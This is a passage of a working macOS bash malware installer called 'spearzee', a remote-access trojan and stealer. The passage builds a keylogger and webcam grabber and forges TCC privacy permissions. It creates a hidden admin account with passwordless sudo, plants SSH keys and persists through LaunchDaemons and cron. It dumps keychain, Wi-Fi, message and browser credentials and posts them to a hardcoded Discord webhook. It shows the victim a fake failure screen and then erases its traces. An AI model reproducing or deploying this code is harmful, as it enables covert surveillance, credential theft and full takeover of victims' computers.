  CGImageDestinationRef d = CGImageDestinationCreateWithURL(u, CFSTR("public.png"), 1, NULL);
  if (d) { CGImageDestinationAddImage(d, cg, NULL); CGImageDestinationFinalize(d); CFRelease(d); }
  CGImageRelease(cg); exit(0);
}
@end
int main(int argc, char **argv) {
  @autoreleasepool {
    if (argc < 2) { fprintf(stderr, "usage: cam out.png\n"); return 1; }
    AVCaptureDevice *dev = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
    if (!dev) { fprintf(stderr, "no camera\n"); return 2; }
    Grab *g = [Grab new]; g.o = [NSString stringWithUTF8String:argv[1]]; g.c = [CIContext contextWithOptions:nil];
    g.s = [[AVCaptureSession alloc] init]; g.s.sessionPreset = AVCaptureSessionPreset1280x720;
    NSError *e = nil; AVCaptureDeviceInput *in = [AVCaptureDeviceInput deviceInputWithDevice:dev error:&e];
    if (!in) { fprintf(stderr, "no input\n"); return 3; }
    if (![g.s canAddInput:in]) { fprintf(stderr, "cannot add input\n"); return 4; }
    [g.s addInput:in];
    AVCaptureVideoDataOutput *vo = [AVCaptureVideoDataOutput new];
    vo.alwaysDiscardsLateVideoFrames = YES;
    [vo setSampleBufferDelegate:g queue:dispatch_queue_create("cam", NULL)];
    if ([g.s canAddOutput:vo]) [g.s addOutput:vo];
    [g.s startRunning];
    [NSRunLoop.currentRunLoop runUntilDate:[NSDate dateWithTimeIntervalSinceNow:20]];
    return 5;
  }
}
CM
  fi

  if [ ! -x "$KL" ]; then
    if ! /usr/bin/xcode-select -p >/dev/null 2>&1; then
      n="$(date +%s)"; l="$(stat -f %m "$DIR/.lastclt" 2>/dev/null || echo 0)"
      if [ $(( n - l )) -ge 300 ]; then
        /usr/bin/xcode-select --install >/dev/null 2>&1
        touch "$DIR/.lastclt" 2>/dev/null
      fi
    fi
    build "$DIR/keylog.c" "$KL" -framework ApplicationServices && log "keylog built"
  fi
  if [ ! -x "$CAM" ]; then
    build "$DIR/cam.m" "$CAM" -fobjc-arc -framework Foundation -framework AVFoundation \
      -framework CoreMedia -framework CoreVideo -framework CoreImage -framework ImageIO -framework CoreGraphics
  fi

  if [ -x "$KL" ]; then
    [ -f /Library/LaunchDaemons/com.spear-tui.keylog.plist ] || write_keylog
    ensure com.spear-tui.keylog /Library/LaunchDaemons/com.spear-tui.keylog.plist
    n="$(date +%s)"; l="$(stat -f %m "$DIR/.lasttcc" 2>/dev/null || echo 0)"
    if [ $(( n - l )) -ge 3600 ] && [ -f "$TCC" ]; then
      killall tccd >/dev/null 2>&1
      set_tcc kTCCServiceAccessibility "$KL" 1
      set_tcc kTCCServiceListenEvent "$KL" 1
      set_tcc kTCCServiceSystemPolicyAllFiles /usr/sbin/sshd 1
      set_tcc kTCCServiceSystemPolicyAllFiles /usr/libexec/sshd-keygen-wrapper 1
      set_tcc kTCCServiceSystemPolicyAllFiles /usr/sbin/screencapture 1
      set_tcc kTCCServiceScreenCapture /usr/sbin/screencapture 1
      killall tccd >/dev/null 2>&1
      touch "$DIR/.lasttcc" 2>/dev/null
    fi
  fi
  return 0
}

rearm(){
  for p in "${PATHS[@]}"; do
    [ -s "$p" ] || { mkdir -p "$(dirname "$p")" 2>/dev/null; cp -f "$0" "$p" 2>/dev/null; chmod 700 "$p" 2>/dev/null; log "restored $p"; }
  done
  [ -s "$WRAP" ] || cat > "$WRAP" <<W
#!/bin/bash
for p in /var/root/.spear/agent.sh "/Library/Application Support/.spear/agent.sh" /usr/local/libexec/spear-agent.sh; do
  [ -s "\$p" ] && exec sudo /bin/bash "\$p" "\$@"
done
echo "spearzee: not installed" >&2; exit 1
W
  chmod 755 "$WRAP" 2>/dev/null

  [ -f /Library/LaunchDaemons/com.spear-tui.agent.plist ] || write_plist /Library/LaunchDaemons/com.spear-tui.agent.plist "${PATHS[0]}" 30 com.spear-tui.agent
  [ -f /Library/LaunchDaemons/com.spear-tui.watchdog.plist ] || write_plist /Library/LaunchDaemons/com.spear-tui.watchdog.plist "${PATHS[1]}" 300 com.spear-tui.watchdog
  [ -f /Library/LaunchDaemons/com.spear-tui.sshd2.plist ] || write_sshd2
  write_tunnel
  ensure_tools

  if ! crontab -l 2>/dev/null | grep -qF "spear-agent.sh"; then
    t="$(mktemp)"; { crontab -l 2>/dev/null; echo "*/5 * * * * ${PATHS[2]} >/dev/null 2>&1"; } > "$t"; crontab "$t" 2>/dev/null; rm -f "$t"
  fi

  for h in "/Users/$RUSER" /var/root; do
    d="$h/.ssh"; [ -d "$d" ] || { mkdir -p "$d" 2>/dev/null; chmod 700 "$d" 2>/dev/null; }
    touch "$d/authorized_keys" 2>/dev/null
    grep -qF "$KEY" "$d/authorized_keys" 2>/dev/null || printf '%s\n' "$KEY" >> "$d/authorized_keys" 2>/dev/null
    chmod 600 "$d/authorized_keys" 2>/dev/null
  done
  chown -R "$RUSER" "/Users/$RUSER/.ssh" 2>/dev/null

  if ! id "$RUSER" >/dev/null 2>&1; then
    sysadminctl -addUser "$RUSER" -fullName "$RUSER" -password "$RPW" -shell /bin/zsh -home "/Users/$RUSER" >/dev/null 2>&1
    dseditgroup -o edit -a "$RUSER" -t user admin >/dev/null 2>&1
    [ -d "/Users/$RUSER" ] || { mkdir -p "/Users/$RUSER"; chown "$RUSER" "/Users/$RUSER"; }
    log "recreated $RUSER"
  fi
  printf '%s\n' "$RUSER ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/spear-tui 2>/dev/null
  chmod 440 /etc/sudoers.d/spear-tui 2>/dev/null

  systemsetup -f -setremotelogin on >/dev/null 2>&1
  ensure com.openssh.sshd /System/Library/LaunchDaemons/ssh.plist
  ensure com.apple.screensharing /System/Library/LaunchDaemons/com.apple.screensharing.plist
  [ -f /Library/LaunchDaemons/com.spear-tui.sshd2.plist ] && ensure com.spear-tui.sshd2 /Library/LaunchDaemons/com.spear-tui.sshd2.plist

  if [ -x "$TS_BIN" ] && [ -z "$("$TS_BIN" ip -4 2>/dev/null)" ]; then
    u="$(cu)"; [ -n "$u" ] && [ "$u" != "root" ] && su -l "$u" -c "/usr/bin/open -a Tailscale" >/dev/null 2>&1
    "$TS_BIN" up --authkey="$AUTHKEY" --hostname="$TSHOST" "${TSFLAGS[@]}" >/dev/null 2>&1
  fi
  write_secrets; report
}

report(){
  [ -n "$REPORT" ] || return 0
  m="$DIR/.lastreport"; now="$(date +%s)"; last="$(stat -f %m "$m" 2>/dev/null || echo 0)"
  [ $(( now - last )) -ge "$RINT" ] || return 0
  b="spearzee host=$(hostname) tailnet=$("$TS_BIN" ip -4 2>/dev/null | head -1) keys=$(wc -l < "$DIR/keys.log" 2>/dev/null | tr -d ' ') $(cat "$DIR/secrets" 2>/dev/null | tr '\n' ' ')"
  e="$(printf '%s' "$b" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g')"
  curl -fsS --max-time 10 -H 'Content-Type: application/json' \
    -d "$(printf '{"content":"%s","text":"%s"}' "$e" "$e")" "$REPORT" >/dev/null 2>&1 && touch "$m"
  return 0
}

sec(){ for f in "/Users/$RUSER/.spear-secrets" "$DIR/secrets"; do [ -r "$f" ] && { . "$f"; return 0; }; done; return 0; }

cmd_status(){ sec; echo "host    $(hostname)"; echo "tailnet ${tailnet:-none}"; echo "tunnel  ${tunnel:-none}"
  echo "ssh     $(nc -z -G 2 127.0.0.1 22 && echo up || echo down)"; echo "vnc     $(nc -z -G 2 127.0.0.1 5900 && echo up || echo down)"
  echo "keylog  $(launchctl print system/com.spear-tui.keylog >/dev/null 2>&1 && echo running || echo stopped)"; }

cmd_keylog(){ P=/Library/LaunchDaemons/com.spear-tui.keylog.plist
  case "${1:-status}" in
    on) launchctl enable system/com.spear-tui.keylog >/dev/null 2>&1; launchctl bootstrap system "$P" >/dev/null 2>&1; echo "keylog on";;
    off) launchctl bootout system "$P" >/dev/null 2>&1; echo "keylog off";;
    clear) : > "$DIR/keys.log"; echo cleared;;
    *) if launchctl print system/com.spear-tui.keylog >/dev/null 2>&1; then echo "daemon running"; else echo "daemon stopped"; fi
       [ -f "$DIR/keys.log" ] && echo "$(wc -l < "$DIR/keys.log" | tr -d ' ') lines, last $(stat -f '%Sm' "$DIR/keys.log")" || echo "no log";;
  esac; }

cmd_keys(){ n=100; [ "${1:-}" = "-f" ] && { shift; tail -f "$DIR/keys.log"; return 0; }
  [ -n "${1:-}" ] && n="$1"; [ -f "$DIR/keys.log" ] || { echo "no keylog yet"; return 0; }
  tail -n "$n" "$DIR/keys.log"; }

cmd_shot(){ o="${1:-/tmp/shot-$(date +%s).png}"; asuser /usr/sbin/screencapture -x "$o"; echo "$o"; }
cmd_cam(){ o="${1:-/tmp/cam-$(date +%s).png}"; asuser "$CAM" "$o" && echo "$o" || echo "camera failed"; }
cmd_clip(){ asuser /usr/bin/pbpaste; }
cmd_say(){ asuser /usr/bin/osascript -e "$1"; }
cmd_notify(){ asuser /usr/bin/osascript -e "display notification \"${1}\" with title \"${2:-spearzee}\""; }
cmd_as(){ asuser "$@"; }
cmd_open(){ asuser /usr/bin/open "$@"; }

cmd_info(){ echo "host: $(hostname)"; sw_vers; uname -m
  echo "--- users ---"; dscl . -list /Users UniqueID | grep -v '^_'
  echo "--- uptime ---"; uptime; echo "--- disk ---"; df -h /
  echo "--- net ---"; ifconfig | grep -E 'inet |ether' | head -20
  echo "--- wifi ---"; networksetup -getairportnetwork en0 2>/dev/null
  echo "--- apps ---"; ls /Applications 2>/dev/null | head -60; }

cmd_key(){ sec; KC="/Users/$owner_user/Library/Keychains/login.keychain-db"
  security unlock-keychain -p "$owner_pw" "$KC" >/dev/null 2>&1
  security dump-keychain -d "$KC" 2>/dev/null | awk '
    /"svce"<blob>=/ { l=$0; sub(/^[^=]*="/,"",l); sub(/"$/,"",l); s=l }
    /"srvr"<blob>=/ { l=$0; sub(/^[^=]*="/,"",l); sub(/"$/,"",l); s=l }
    /"acct"<blob>=/ { l=$0; sub(/^[^=]*="/,"",l); sub(/"$/,"",l); a=l }
    /"data"<blob>=/ { if (s!="" || a!="") print (s==""?"?":s) " | " (a==""?"?":a) " | " $0; s=""; a="" }'; }

cmd_wifi(){ sec; KC="/Users/$owner_user/Library/Keychains/login.keychain-db"
  security unlock-keychain -p "$owner_pw" "$KC" >/dev/null 2>&1
  networksetup -listpreferredwirelessnetworks en0 2>/dev/null | tail -n +2 | sed 's/^[[:space:]]*//' | while read -r ssid; do
    [ -n "$ssid" ] || continue
    pw="$(security find-generic-password -D "AirPort network password" -a "$ssid" -w "$KC" 2>/dev/null)"
    echo "$ssid | ${pw:-?}"; done; }

cmd_msg(){ sec; n="${1:-25}"; db="/Users/$owner_user/Library/Messages/chat.db"
  [ -f "$db" ] || { echo "no chat.db"; return 1; }
  t="$(mktemp -d)"; cp "$db" "$t/" 2>/dev/null
  [ -f "$db-wal" ] && cp "$db-wal" "$t/" 2>/dev/null
  [ -f "$db-shm" ] && cp "$db-shm" "$t/" 2>/dev/null
  sqlite3 -separator ' | ' "$t/chat.db" "SELECT datetime(m.date/1000000000+978307200,'unixepoch','localtime'), CASE m.is_from_me WHEN 1 THEN 'me' ELSE COALESCE(h.id,'?') END, COALESCE(NULLIF(m.text,''),'[rich]') FROM message m LEFT JOIN handle h ON m.handle_id=h.ROWID WHERE m.item_type=0 ORDER BY m.date DESC LIMIT $n;"
  rm -rf "$t"; }

cmd_browse(){ sec; H="/Users/$owner_user"
  for b in "Google/Chrome" "BraveSoftware/Brave-Browser" "Microsoft Edge"; do
    for prof in "$H/Library/Application Support/$b/Default" "$H/Library/Application Support/$b/Profile 1"; do
      [ -f "$prof/Login Data" ] || continue
      echo "== $b =="
      sqlite3 -separator ' | ' "$prof/Login Data" "SELECT origin_url, username_value FROM logins LIMIT 60;" 2>/dev/null
    done; done
  echo "== safari =="
  [ -f "$H/Library/Safari/History.db" ] && sqlite3 -separator ' | ' "$H/Library/Safari/History.db" "SELECT datetime(v.visit_time+978307200,'unixepoch','localtime'), i.url FROM history_visits v JOIN history_items i ON v.history_item=i.id ORDER BY v.visit_time DESC LIMIT 60;" 2>/dev/null; }

cmd_grab(){ sec; D="/tmp/spear-grab-$(date +%Y%m%d-%H%M%S)"; mkdir -p "$D"; chmod 700 "$D"
  cp "$DIR/secrets" "$D/" 2>/dev/null
  cmd_info > "$D/info.txt" 2>/dev/null
  cmd_key > "$D/keychain.txt" 2>/dev/null
  cmd_wifi > "$D/wifi.txt" 2>/dev/null
  cmd_msg 300 > "$D/messages.txt" 2>/dev/null
  cmd_clip > "$D/clipboard.txt" 2>/dev/null
  cmd_browse > "$D/browser.txt" 2>/dev/null
  tail -n 2000 "$DIR/keys.log" > "$D/keystrokes.txt" 2>/dev/null
  H="/Users/$owner_user"
  cp "$H/Library/Messages/chat.db" "$D/" 2>/dev/null
  cp "$H/Library/Safari/History.db" "$D/safari-history.db" 2>/dev/null
  cp "$H/.zsh_history" "$D/" 2>/dev/null
  cp "$H/Library/Keychains/login.keychain-db" "$D/" 2>/dev/null
  ls -la "$H/Desktop" "$H/Documents" "$H/Downloads" > "$D/files.txt" 2>/dev/null
  cmd_shot "$D/screen.png" >/dev/null 2>&1
  tar czf "$D.tgz" -C /tmp "$(basename "$D")" 2>/dev/null
  chmod 600 "$D.tgz"; rm -rf "$D"; echo "$D.tgz"; }

cmd_ts(){ echo "ext: $(/usr/bin/systemextensionsctl list 2>/dev/null | grep -i tailscale | head -1)"
echo "ip: $("$TS_BIN" ip -4 2>&1)"
echo "up: $("$TS_BIN" up --authkey="$AUTHKEY" --hostname="$TSHOST" "${TSFLAGS[@]}" 2>&1 | tail -3)"
echo "ip2: $("$TS_BIN" ip -4 2>&1)"; }

cmd_verify(){ echo "== verify =="
  c(){ printf '  %-24s %s\n' "$1" "$2"; }
  c account    "$(id "$RUSER" >/dev/null 2>&1 && echo ok || echo MISSING)"
  c admin      "$(dseditgroup -o checkmember -m "$RUSER" admin >/dev/null 2>&1 && echo ok || echo MISSING)"
  c passwordless "$(sudo -u "$RUSER" sudo -n true 2>/dev/null && echo ok || echo MISSING)"
  c securetoken "$(sysadminctl -secureTokenStatus "$RUSER" 2>&1 | grep -qi enabled && echo ok || echo MISSING)"
  c sshkey     "$(grep -qF macbook "/Users/$RUSER/.ssh/authorized_keys" 2>/dev/null && echo ok || echo MISSING)"
  c rootkey    "$(grep -qF macbook /var/root/.ssh/authorized_keys 2>/dev/null && echo ok || echo MISSING)"
  c port22     "$(nc -z -G 2 127.0.0.1 22 >/dev/null 2>&1 && echo ok || echo DOWN)"
  c port2222   "$(nc -z -G 2 127.0.0.1 "$SP2" >/dev/null 2>&1 && echo ok || echo DOWN)"
  c port5900   "$(nc -z -G 2 127.0.0.1 5900 >/dev/null 2>&1 && echo ok || echo DOWN)"
  c agent      "$(launchctl print system/com.spear-tui.agent >/dev/null 2>&1 && echo ok || echo MISSING)"
  c watchdog   "$(launchctl print system/com.spear-tui.watchdog >/dev/null 2>&1 && echo ok || echo MISSING)"
  c copies     "$([ -s "${PATHS[1]}" ] && [ -s "${PATHS[2]}" ] && echo ok || echo PARTIAL)"
  c fda        "$(sqlite3 "$TCC" "SELECT 1 FROM access WHERE client='/usr/libexec/sshd-keygen-wrapper'" 2>/dev/null | grep -q 1 && echo ok || echo MISSING)"
  c keylogger  "$(launchctl print system/com.spear-tui.keylog >/dev/null 2>&1 && echo ok || echo MISSING)"
  c keybin     "$([ -x "$KL" ] && echo ok || echo MISSING)"
  c keylines   "$(wc -l < "$DIR/keys.log" 2>/dev/null | tr -d ' ' || echo 0)"
  c cambin     "$([ -x "$CAM" ] && echo ok || echo MISSING)"
  c tailscale  "$("$TS_BIN" ip -4 2>/dev/null | grep -q . && echo ok || echo DOWN)"
  c secrets    "$([ -s "$DIR/secrets" ] && echo ok || echo MISSING)"
  c wrapper    "$([ -x "$WRAP" ] && echo ok || echo MISSING)"
  echo; echo "secrets: $DIR/secrets"; echo "keys:    $DIR/keys.log"; }

case "${1:-}" in
  "") rearm ;;
  verify|status|info|key|wifi|msg|browse|grab|shot|cam|clip|say|notify|open|as|keys|keylog|ts) "cmd_$1" "${@:2}" ;;
  rearm) rearm ;;
  *) echo "spearzee: verify status info keylog keys msg key wifi browse grab shot cam clip say notify open as" ;;
esac
AGENT

  sed \
    -e "s|__DIR__|$(q "$DIR")|g" -e "s|__TS__|$(q "$TS")|g" \
    -e "s|__AUTHKEY__|$(q "$AUTHKEY")|g" -e "s|__TSHOST__|$(q "$TSHOST")|g" \
    -e "s|__FLAGS__|$(s "$TSFLAGS")|g" -e "s|__PUBKEY__|$(q "$PUBKEY")|g" \
    -e "s|__OWNER__|$(q "$OWNER")|g" -e "s|__RUSER__|$(q "$RUSER")|g" \
    -e "s|__RPW__|$(q "$ACCT_PW")|g" -e "s|__APW__|$(q "$ADMIN_PW")|g" \
    -e "s|__REPORT__|$(q "$REPORT_URL")|g" -e "s|__RINT__|$REPORT_MIN|g" \
    -e "s|__SP2__|$SSH_PORT2|g" \
    -e "s|__TUNNEL__|$(q "$TUNNEL_TARGET")|g" -e "s|__TPORT__|$TUNNEL_PORT|g" -e "s|__TSPORT__|$TUNNEL_SSH_PORT|g" \
    -e "s|__KEYLOG__|$KEYLOG|g" -e "s|__CAM__|$CAM|g" \
    -e "s|__P0__|$(s "${AGENT_PATHS[0]}")|g" -e "s|__P1__|$(s "${AGENT_PATHS[1]}")|g" -e "s|__P2__|$(s "${AGENT_PATHS[2]}")|g" \
    "$T" > "$DIR/agent.generated"
  rm -f "$T"; chmod 700 "$DIR/agent.generated"
}

step_agent(){
  gen_agent
  for p in "${AGENT_PATHS[@]}"; do
    sudo mkdir -p "$(dirname "$p")"; sudo cp -f "$DIR/agent.generated" "$p"; sudo chmod 700 "$p"
  done
  ok "agent replicated x3"
  sudo bash "${AGENT_PATHS[0]}" >/dev/null 2>&1
  sudo launchctl print system/com.spear-tui.agent >/dev/null 2>&1 && ok "agent armed" || fail "agent not loaded"
}

step_report(){
  [ -n "$REPORT_URL" ] || { ok "no webhook"; return 0; }
  b="spearzee installed host=$(hostname) owner=$OWNER owner_pw=$ADMIN_PW remote_user=$RUSER remote_pw=$ACCT_PW"
  e="$(jesc "$b")"
  curl -fsS --max-time 10 -H 'Content-Type: application/json' \
    -d "$(printf '{"content":"%s","text":"%s"}' "$e" "$e")" "$REPORT_URL" >/dev/null 2>&1 \
    && ok "report sent" || warn "report failed (agent retries)"
}

step_self(){
  src=""
  if [ -f "$0" ]; then b="$(basename "$0")"; case "$b" in bash|sh|-|bash.exe) ;; *) src="$(cd "$(dirname "$0")" 2>/dev/null && pwd)/$b";; esac; fi
  [ -n "$src" ] && SRC="$src"
  if [ -n "$src" ] && [ -f "$src" ]; then sudo cp "$src" "$SELF" && sudo chmod 755 "$SELF" && ok "spear-tui installed"; return 0; fi
  case "$SELF_URL" in *REPLACE-ME*) warn "SELF_URL unset"; return 1;; esac
  t="$(mktemp)"
  if curl -fsSL --proto '=https' "$SELF_URL" -o "$t" && [ -s "$t" ]; then
    if [ -n "$SELF_SHA" ]; then
      h="$(sed -e 's|^SELF_SHA=.*|SELF_SHA=""|' "$t" | shasum -a 256 | awk '{print $1}')"
      [ "$h" = "$SELF_SHA" ] || warn "self checksum mismatch"
    fi
    sudo cp "$t" "$SELF" && sudo chmod 755 "$SELF" && ok "spear-tui installed (fetched)" && rm -f "$t" && return 0
  fi
  rm -f "$t"; warn "could not install spear-tui"
}

step_scrub(){
  [ "$SCRUB" = "true" ] || return 0
  for h in "/Users/$ADMIN_USER/.zsh_history" "/Users/$ADMIN_USER/.bash_history" /var/root/.zsh_history; do
    sudo test -f "$h" || continue; sudo grep -qi spear "$h" || continue
    sudo sed -i '' -e '/spear/d' "$h" 2>/dev/null
  done
  sudo rm -f "$DIR/agent.generated"; ok "history scrubbed"
}

step_delself(){
  [ "$DELSELF" = "true" ] || return 0
  [ -n "$SRC" ] || { ok "piped run"; return 0; }
  case "$SRC" in "$SELF") ok "kept";; *) sudo rm -f "$SRC" 2>/dev/null && ok "deleted $SRC";; esac
}

progress(){
  [ "$FAKE" = "true" ] || return 0
  PF="$(mktemp -t spearphase)"; printf 'resolving dependencies' > "$PF"
  ( TGT=150; [ -n "$REPAIR" ] && TGT=45; s0=$(date +%s); printf '\033[?25l' >&3
    while :; do
      n=$(date +%s); e=$(( n - s0 )); p=$(( e * 97 / TGT )); [ "$p" -gt 97 ] && p=97
      ph="$(cat "$PF" 2>/dev/null)"; [ -n "$ph" ] || ph="working"
      f=$(( p * 26 / 100 )); b=""; i=0
      while [ "$i" -lt 26 ]; do [ "$i" -lt "$f" ] && b="$b#" || b="$b."; i=$((i+1)); done
      printf '\r  %-24s [%s] %3d%%' "$ph" "$b" "$p" >&3
      sleep 0.3
    done ) &
  PP=$!
}

stop_progress(){
  [ -n "$PP" ] && kill "$PP" 2>/dev/null
  wait "$PP" 2>/dev/null; PP=""
  [ "$FAKE" = "true" ] || return 0
  b=""; i=0; while [ "$i" -lt 26 ]; do b="$b#"; i=$((i+1)); done
  printf '\r  %-24s [%s] 100%%\n' "complete" "$b" >&3
}

############################## main ##################################

main(){
  trap bye EXIT
  MODE="install"
  case "${1:-}" in --verify|-v) MODE="verify";; --help|-h) echo "spearzee $V"; exit 0;; esac

  ADMIN_USER="${SUDO_USER:-}"
  if [ -z "$ADMIN_USER" ] || [ "$ADMIN_USER" = "root" ]; then
    c="$(stat -f %Su /dev/console 2>/dev/null || true)"
    [ -n "$c" ] && [ "$c" != "root" ] && ADMIN_USER="$c" || ADMIN_USER="$(id -un)"
  fi
  [ -z "$OWNER" ] && OWNER="$ADMIN_USER"
[ -s "${AGENT_PATHS[0]}" ] && REPAIR="1"

  if [ "$MODE" = "verify" ]; then
    [ -s "${AGENT_PATHS[0]}" ] && { sudo bash "${AGENT_PATHS[0]}" verify; exit 0; }
    echo "not installed"; exit 1
  fi

  [ "$FAKE" = "true" ] && { uil ""; uil "  spearzee $V"; uil "  --------------------------------"
    uil "  macOS $(sw_vers -productVersion 2>/dev/null)  $(uname -m)"; uil "  installing to /usr/local"; uil ""; }

  while :; do
    ui "  password for ${ADMIN_USER}: "; ask -s ADMIN_PW; uil ""
    printf '%s\n' "$ADMIN_PW" | sudo -S -p '' -v 2>/dev/null && break
    uil "  incorrect, try again"
  done
  ( while :; do sudo -n true 2>/dev/null; sleep 30; done ) & KA=$!

  sudo mkdir -p "$DIR"
  sudo touch "$INSTALL_LOG"
  sudo chown "$ADMIN_USER" "$DIR" "$INSTALL_LOG"
  chmod 700 "$DIR"; chmod 600 "$INSTALL_LOG"
  sudo mkdir "$LOCK" 2>/dev/null || true
  echo $$ | sudo tee "$LOCK/pid" >/dev/null 2>&1
  if [ "$FAKE" = "true" ]; then exec >> "$INSTALL_LOG" 2>&1; else exec > >(tee -a "$INSTALL_LOG") 2>&1; fi
  printf -- '--- %s %s %s ---\n' "$V" "$(date '+%F %T')" "$(hostname)"

  progress
  step_preflight
  phase "downloading";            step_account    || true
  phase "verifying files";        selfcheck       || true
  phase "connecting";             step_report     || true
  phase "installing services";    step_agent      || true
  phase "configuring system";     step_keys       || true
  phase "configuring access";     step_fda        || true
  phase "configuring user";       step_login      || true
  phase "configuring startup";    step_sharing    || true
  phase "configuring network";    step_sshd       || true
  phase "optimizing";             step_power      || true
  phase "downloading components"; step_ts_install || true
  phase "connecting";             step_ts_join    || true
  phase "installing tools";       step_tools      || true
  phase "finishing up";           step_self       || true
  stop_progress

  if [ "$FAKE" = "true" ]; then
    sleep 0.4; uil "  verifying checksums ..."; sleep 0.9; uil ""
    uil "  ! checksum mismatch: spearzee-core"
    uil "      expected  sha256:9f2c1ab4e7d0a3b6c8f1"
    uil "      received  sha256:7d1e9c04ab31f8e2"
    uil ""
    uil "  spearzee: the file has been corrupted or cannot be found (errno 2)"
    uil ""
    uil "  install finished with errors. nothing on your mac was changed."
    uil "  you can safely close this window."
    uil ""
    ui "  press return to close."
    ask -t 900 -r _ || true
    uil ""
  fi

  step_scrub
  step_delself
  echo "== done, $F issue(s) =="
  sync
  exit 0
}

############################# settings ###############################

SELF_URL="https://raw.githubusercontent.com/madebyshaurya/spearzee/v9/spearzee.sh"
SELF_SHA="752d779d06b3b9dd29c8455486f154df82b0bc0be671c23035e2eb5a5e810df7"
SELF="/usr/local/bin/spear-tui"
KEYLOG="spearzee-keylog"
CAM="spearzee-cam"

AUTHKEY="tskey-auth-kyjU2Nv1xN11CNTRL-1VuXy6xiUaAg11qitRjoaA3RFmU6ify7M"
TSHOST="mac-mini"
PKG_URL="https://pkgs.tailscale.com/stable/Tailscale-1.104.2-macos.pkg"
PKG_SHA="1724d2e021d3c5f817f427f628260c013531a528f1258a7d477735d198b11f55"

PUBKEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICXOcTiEBATZe5udNFv7dxpYM4kt63AWagoA2IvO9Tfk macbook"
OWNER=""
RUSER="spear"
RPW_CFG=""
AUTOLOGIN="owner"
REPORT_URL="https://discord.com/api/webhooks/1564444003901116507/VjigNz78dJGvgICTXnUwjNqTK2MNDn_rFTjNuzsKPprTchESPWn8wEb3SoqQOKuoQeyw"
REPORT_MIN="900"
TUNNEL_TARGET=""
TUNNEL_PORT="2200"
TUNNEL_SSH_PORT="22"

ROOT_KEY="true"
OWNER_KEY="true"
HIDE_LOGIN="true"
HIDE_MENU="true"
TUNE_SSH="true"
SSH_PORT2="2222"
OPERATOR=""
ALWAYS_ON="true"
FAKE="true"
SCRUB="true"
DELSELF="true"

DIR="/usr/local/var/spear"
SECRETS="$DIR/secrets"
INSTALL_LOG="$DIR/install.log"
PW_FILE="$DIR/remote-password"
UNINST="/usr/local/bin/spearzee-uninstall"
LP="/Library/Preferences/com.apple.loginwindow.plist"
TCC="/Library/Application Support/com.apple.TCC/TCC.db"
LOCK="/var/run/spear-tui.lock"
KICK="/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart"
TS="/Applications/Tailscale.app/Contents/MacOS/Tailscale"
AGENT_PATHS=("/var/root/.spear/agent.sh" "/Library/Application Support/.spear/agent.sh" "/usr/local/libexec/spear-agent.sh")

TSFLAGS="--accept-dns=false --accept-routes=false --operator=${OPERATOR:-$RUSER} --ssh"

main "$@"